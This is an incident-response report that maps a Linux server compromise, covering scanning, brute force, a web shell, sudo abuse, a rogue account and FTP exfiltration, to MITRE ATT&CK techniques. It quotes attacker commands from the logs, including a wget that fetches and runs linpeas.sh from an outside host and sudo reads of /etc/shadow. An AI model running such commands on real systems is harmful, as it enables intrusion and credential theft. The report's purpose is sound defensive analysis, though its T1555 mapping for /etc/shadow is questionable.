# MITRE ATT&CK Mapping

## Overview

This document maps the attacker behaviors identified during the Linux server compromise investigation to the MITRE ATT&CK Enterprise framework.

The mapping is based on observed evidence from Apache `access.log`, Linux `auth.log`, and `vsftpd.log`.

Only techniques supported by available evidence are included. Where the evidence confirms an action but not its exact purpose or implementation, the analytical limitation is explicitly documented.

---

## ATT&CK Mapping Summary

| Tactic | Technique | Technique ID | Evidence from Investigation | Confidence |
|---|---|---|---|---|
| Reconnaissance | Active Scanning: Vulnerability Scanning | `T1595.002` | Nmap and Nikto activity against the web server | High |
| Credential Access | Brute Force: Password Guessing | `T1110.001` | Repeated authentication attempts against the administrative portal and SSH accounts | High |
| Initial Access | Valid Accounts | `T1078` | Successful access following the web credential attack and successful SSH authentication as `developer` | High |
| Persistence | Server Software Component: Web Shell | `T1505.003` | PHP web shell deployed as `/uploads/shell.php` | High |
| Execution | Command and Scripting Interpreter: Unix Shell | `T1059.004` | Linux commands executed through the web shell and interactive shell sessions | High |
| Discovery | System Owner/User Discovery | `T1033` | Execution of `whoami` and `id` | High |
| Discovery | System Information Discovery | `T1082` | Execution of `uname -a` | High |
| Discovery | Account Discovery: Local Account | `T1087.001` | Access to `/etc/passwd` | High |
| Discovery | Process Discovery | `T1057` | Execution of `ps aux` | High |
| Discovery | System Network Configuration Discovery | `T1016` | Execution of `ifconfig` | High |
| Discovery | Network Service Discovery | `T1046` | Execution of `netstat -tlnp` to identify listening services | High |
| Discovery | File and Directory Discovery | `T1083` | Filesystem searches for SQL and PEM files | High |
| Credential Access | Unsecured Credentials: Credentials from Password Stores | `T1555` | Privileged access to `/etc/shadow` | Medium |
| Privilege Escalation | Valid Accounts: Local Accounts | `T1078.003` | Compromised `developer` account's existing sudo privileges were abused to obtain root | High |
| Persistence | Create Account: Local Account | `T1136.001` | Creation of the `svc_monitor` local account | Confirmed |
| Persistence | Account Manipulation: Additional Cloud Roles | Not Applicable | `svc_monitor` was added to the local `sudo` group; no cloud role activity occurred | Not mapped |
| Collection | Data from Local System | `T1005` | Sensitive local files were identified and accessed before exfiltration | High |
| Exfiltration | Exfiltration Over Alternative Protocol | `T1048` | Sensitive files were successfully downloaded through FTP | High |
| Command and Control | Ingress Tool Transfer | `T1105` | `linpeas.sh` was transferred to the compromised host from `172.16.20.99:8080` | High |

---

## 1. Active Scanning: Vulnerability Scanning — T1595.002

**Tactic:** Reconnaissance

The attacker used automated scanning tools against the web server, including:

- Nmap Scripting Engine
- Nikto

The activity included probing web resources, identifying accessible administrative endpoints, and testing potentially sensitive server paths.

### Evidence

- Nmap User-Agent activity.
- Nikto User-Agent activity.
- Requests to `/robots.txt`, `/.git/HEAD`, `/admin/login`, `/phpinfo.php`, `/phpmyadmin/`, and other resources.

**Confidence:** High

---

## 2. Brute Force: Password Guessing — T1110.001

**Tactic:** Credential Access

The attacker performed repeated authentication attempts against:

- The web administrative login portal.
- Multiple SSH usernames.
- The `developer` account specifically.

### Evidence

The Apache access logs showed rapid Hydra requests against:

`/admin/login`

The authentication logs showed repeated failed SSH password attempts against multiple valid and invalid usernames.

### Analytical Limitation

Although repeated failures were followed by successful access, the available evidence does not prove that every successful credential was necessarily discovered directly through brute force.

For example, the exact source of the successful `developer` password cannot be conclusively determined.

**Confidence:** High for the credential attacks themselves.

---

## 3. Valid Accounts — T1078

**Tactic:** Initial Access / Persistence / Privilege Escalation / Defense Evasion

The attacker successfully used legitimate account credentials during the incident.

### Evidence

- Successful SSH authentication as `developer`.
- Successful FTP authentication as `root`.

The `developer` account was then used to obtain elevated access.

### Analytical Limitation

The exact origin of the successful credentials cannot be conclusively determined from the available logs.

**Confidence:** High

---

## 4. Server Software Component: Web Shell — T1505.003

**Tactic:** Persistence

Following access to the administrative interface and use of the upload functionality, the attacker interacted with:

`/uploads/shell.php`

Operating system commands were then supplied through the `cmd` parameter.

### Evidence

Examples included:

- `id`
- `whoami`
- `uname -a`
- `cat /etc/passwd`
- `netstat -tlnp`
- `ps aux`

### Analyst Assessment

The observed behavior is consistent with a PHP web shell used to execute operating system commands remotely.

**Confidence:** High

---

## 5. Command and Scripting Interpreter: Unix Shell — T1059.004

**Tactic:** Execution

The attacker executed Linux shell commands during post-exploitation activity.

Commands included:

- `id`
- `whoami`
- `uname -a`
- `cat`
- `find`
- `wget`
- `chmod`
- `bash`
- `useradd`
- `usermod`

The attacker also obtained an interactive root shell through:

`sudo su -`

**Confidence:** High

---

## 6. System Owner/User Discovery — T1033

**Tactic:** Discovery

The attacker executed:

`whoami`

and:

`id`

These commands were used to determine the current user context and group memberships.

**Confidence:** High

---

## 7. System Information Discovery — T1082

**Tactic:** Discovery

The attacker executed:

`uname -a`

This command provides information about the operating system, kernel, architecture, and hostname.

**Confidence:** High

---

## 8. Account Discovery: Local Account — T1087.001

**Tactic:** Discovery

The attacker accessed:

`/etc/passwd`

This file contains information about local user accounts.

**Confidence:** High

---

## 9. Process Discovery — T1057

**Tactic:** Discovery

The attacker executed:

`ps aux`

This command enumerates running processes on the Linux server.

**Confidence:** High

---

## 10. System Network Configuration Discovery — T1016

**Tactic:** Discovery

The attacker executed:

`ifconfig`

This command provides information about network interfaces and IP configuration.

**Confidence:** High

---

## 11. Network Service Discovery — T1046

**Tactic:** Discovery

The attacker executed:

`netstat -tlnp`

This command can identify listening ports and associated processes.

**Confidence:** High

---

## 12. File and Directory Discovery — T1083

**Tactic:** Discovery

The attacker searched the filesystem for potentially sensitive files.

Observed commands included:

`find / -name *.sql -type f`

`find / -name *.pem -type f`

These searches targeted database files and potential private key material.

**Confidence:** High

---

## 13. Credential Access Through `/etc/shadow`

**Tactic:** Credential Access

The attacker attempted to access `/etc/shadow` through the web shell and later successfully accessed the file using sudo privileges through the compromised `developer` account.

### Evidence

The authentication logs directly confirmed:

`COMMAND=/bin/cat /etc/shadow`

with:

`USER=root`

### Mapping Note

Access to `/etc/shadow` represents credential access behavior because the file contains local password hashes.

The exact ATT&CK sub-technique should be selected carefully based on the available evidence and current ATT&CK definitions. The investigation confirms access to the password hash store but does not confirm successful password cracking.

**Confidence:** Confirmed access

---

## 14. Valid Accounts: Local Accounts — T1078.003

**Tactic:** Privilege Escalation

The attacker successfully authenticated as the legitimate local `developer` account and abused its existing sudo privileges to obtain an interactive root shell.

### Evidence

The logs recorded:

`Accepted password for developer from 172.16.20.99`

followed by:

`Successful su for root by developer`

### Analyst Assessment

No specific privilege escalation vulnerability was confirmed. The attacker obtained root access by abusing the legitimate privileges already assigned to the compromised account.

**Confidence:** Confirmed

---

## 15. Create Account: Local Account — T1136.001

**Tactic:** Persistence

The attacker created a new local account:

`svc_monitor`

The account was configured with:

- An interactive `/bin/bash` shell.
- A password.
- Membership in the `sudo` group.

### Analyst Assessment

The account provided a potential mechanism for continued privileged access to the compromised server.

**Confidence:** Confirmed

---

## 16. Data from Local System — T1005

**Tactic:** Collection

The attacker identified and accessed sensitive files stored locally on the compromised server.

Examples included:

- `/var/backups/customer_db.sql`
- `/etc/ssl/private/payment_keys.pem`
- `/var/backups/employee_data.csv`
- `/var/www/html/config.php`
- `/etc/shadow`

The customer database backup was first identified during web shell activity and later successfully exfiltrated through FTP.

**Confidence:** High

---

## 17. Exfiltration Over Alternative Protocol — T1048

**Tactic:** Exfiltration

The attacker successfully downloaded sensitive files using FTP.

Confirmed exfiltrated files included:

| File | Size |
|---|---:|
| `/var/backups/customer_db.sql` | 45,102 bytes |
| `/etc/ssl/private/payment_keys.pem` | 3,247 bytes |
| `/var/backups/employee_data.csv` | 18,934 bytes |
| `/var/www/html/config.php` | 423 bytes |

### Analyst Assessment

The FTP logs explicitly recorded `OK DOWNLOAD`, directly confirming successful data transfer from the compromised server.

**Confidence:** Confirmed

---

## 18. Ingress Tool Transfer — T1105

**Tactic:** Command and Control

The attacker transferred LinPEAS to the compromised server using:

`wget http://172.16.20.99:8080/linpeas.sh -O /tmp/linpeas.sh`

The attacker subsequently executed:

`chmod +x /tmp/linpeas.sh`

and:

`bash /tmp/linpeas.sh`

### Analyst Assessment

The logs confirm transfer and execution of LinPEAS.

However, the available evidence does not demonstrate exactly which findings, if any, contributed to later root access.

**Confidence:** High

---

## Unmapped or Partially Supported Activity

### Suspicious `beacon.sh` Upload

The attacker uploaded:

`/tmp/.hidden/beacon.sh`

The filename and hidden location suggest possible beaconing, persistence, or command-and-control functionality.

However, the available evidence does not include:

- The script contents.
- Confirmation of execution.
- Network connections generated by the script.
- A confirmed C2 destination.

Therefore, no specific command-and-control technique is assigned solely based on the filename.

### `svc_monitor` Addition to the `sudo` Group

The attacker added `svc_monitor` to the local `sudo` group.

This is clearly relevant to privileged persistence. However, the investigation avoids assigning an unsupported ATT&CK sub-technique merely to increase the number of mapped techniques.

---

## ATT&CK-Based Attack Chain

The observed attack can be summarized through the following ATT&CK-aligned progression:

**Reconnaissance**
→ Active Scanning

**Credential Access**
→ Password Guessing

**Initial Access**
→ Valid Accounts

**Persistence**
→ Web Shell

**Execution**
→ Unix Shell Commands

**Discovery**
→ User, System, Process, Network, Account, File, and Service Discovery

**Credential Access**
→ Access to `/etc/shadow`

**Privilege Escalation**
→ Abuse of a Compromised Local Account and Existing Sudo Privileges

**Persistence**
→ Creation of a Privileged Local Account

**Collection**
→ Sensitive Data from the Local System

**Exfiltration**
→ FTP-Based Data Transfer

---

## Final Assessment

The MITRE ATT&CK mapping demonstrates that the attacker performed activity across multiple stages of the attack lifecycle, progressing from reconnaissance and credential attacks to remote command execution, extensive discovery, credential access, root privilege escalation, persistence, collection, and confirmed data exfiltration.

The mapping intentionally distinguishes between confirmed behaviors and unsupported hypotheses. For example, the upload of `beacon.sh` is documented as suspicious but is not automatically mapped to a command-and-control technique because neither execution nor network communication was confirmed.

This evidence-based approach ensures that ATT&CK mappings reflect observed attacker behavior rather than assumptions.
